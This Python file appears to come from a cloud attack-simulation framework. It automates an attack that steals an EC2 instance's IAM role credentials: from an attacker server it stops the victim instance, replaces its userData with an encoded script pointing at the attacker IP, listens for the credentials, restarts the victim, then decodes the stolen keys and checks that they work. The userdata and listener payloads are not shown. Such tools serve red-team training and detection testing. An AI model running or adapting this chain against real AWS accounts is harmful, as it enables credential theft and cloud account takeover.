import os
import pyfiglet
import time
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from core.helpers import generate_ssh_key

def scenario_4_execute():
    print("-"*30)
    print(colored("Executing Scenraio 4 : Exfiltrate EC2 role credentials using IMDSv2 with least privileged access", color="red"))
    loading_animation()
    print("-"*30)

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)
    
    file_path = "./core/aws-scenario-3-output.json"
    if os.path.exists(file_path):
        os.remove(file_path)
        print("File '{}' found and deleted.".format(file_path))
    else:
        print("File '{}' not found.".format(file_path))

    generate_ssh_key()

    subprocess.call("cd ./scenarios/scenario_4/infra/ && pulumi up -s aws-scenario-3 -y", shell=True)
    subprocess.call("cd ./scenarios/scenario_4/infra/ && pulumi stack -s aws-scenario-3 output --json >> ../../../core/aws-scenario-3-output.json", shell=True)

    with open("./core/aws-scenario-3-output.json", "r") as file:
        data = json.load(file)

    ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
    VICTIM_SERVER_PUBLIC_IP = data["Victim Server Public IP"]
    ATTACKER_SERVER_INSTANCE_ID = data["Attacker Server Instance ID"]
    VICTIM_SERVER_INSTANCE_ID = data["Victim Server Instance ID"]
    SUBNET_ID = data["Subnet ID"]
    AMI_ID = data["AMI ID"]
    KEY_PAIR_NAME = data["Key Pair Name"]
    REGION = data["Region"]
    VICTIM_SERVER_ROLE_NAME = data["victim_role_name"]

    ssh_cmd = '''f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP}"'''

    sleep_duration = 80
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval

    #subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+ATTACKER_SERVER_PUBLIC_IP+" 'cat /etc/hostname'", shell=True)

    print(colored("Stopping the Remote Instance", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'aws ec2 stop-instances --instance-ids {VICTIM_SERVER_INSTANCE_ID} --region {REGION}'", shell=True)
    sleep_duration = 60
    with tqdm(total=sleep_duration, desc="Loading") as pbar:
        while sleep_duration > 0:
            sleep_interval = min(1, sleep_duration)
            sleep(sleep_interval)
            
            pbar.update(sleep_interval)
            sleep_duration -= sleep_interval
    
    print(ATTACKER_SERVER_PUBLIC_IP)
    ip_sed_command = f"sed -i -e 's/ipaddress/{ATTACKER_SERVER_PUBLIC_IP}/g' userdata.txt"
    role_sed_command = f"sed -i -e 's/rolenamehere/{VICTIM_SERVER_ROLE_NAME}/g' userdata.txt"
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} \"{ip_sed_command}\"", shell=True)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} \"{role_sed_command}\"", shell=True)

    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'cat userdata.txt | base64 > ud.txt'", shell=True)

    print(colored("Modifying Userdata of the Instance", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'aws ec2 modify-instance-attribute --attribute userData --value file://ud.txt --instance-id {VICTIM_SERVER_INSTANCE_ID} --region {REGION}'", shell=True)

    print(colored("Starting server on port 8000 and listening for credentials", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'nohup python3 server.py > server.log 2>&1 &'",shell=True)

    print(colored("Starting the Victim Server", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'aws ec2 start-instances --instance-ids {VICTIM_SERVER_INSTANCE_ID} --region {REGION}'", shell=True)

    print(colored("Extracting the credential received on Attacker Server & Verifying the credential", color="red"))
    loading_animation()
    print("-"*30)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'cat data.txt | base64 -d > creds.json'", shell=True)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'export AWS_ACCESS_KEY_ID=$(cat creds.json | jq -r '.AccessKeyId') && export AWS_SECRET_ACCESS_KEY=$(cat creds.json | jq -r '.SecretAccessKey') && export AWS_SESSION_TOKEN=$(cat creds.json | jq -r '.Token')'", shell=True)
    subprocess.call(f"ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@{ATTACKER_SERVER_PUBLIC_IP} 'aws sts get-caller-identity'", shell=True)
